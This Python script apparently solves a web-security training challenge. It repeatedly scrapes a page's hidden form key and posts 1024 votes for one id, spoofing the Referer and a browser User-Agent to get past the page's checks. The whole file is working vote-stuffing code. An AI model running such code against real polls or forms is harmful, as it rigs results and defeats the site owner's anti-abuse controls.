#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup

url_hodor = "http://158.69.76.135/level2.php"


def current_session(session):
    current = session.get(url_hodor)
    soup = BeautifulSoup(current.text, "html.parser")
    result = soup.find_all('input', {'type': 'hidden'})
    return {
        "session": {
            "id": "4386",
            "holdthedoor": "Submit",
            "key": result[0].get("value"),
        },
        "headers": {
            "referer": url_hodor,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        }
    }


with requests.session() as session:
    for i in range(1024):
        data = current_session(session)
        res = session.post(
            url=url_hodor,
            data=data["session"],
            headers=data["headers"],
        )
        # print(res.text)
        print(f"Vote count:{i + 1}")
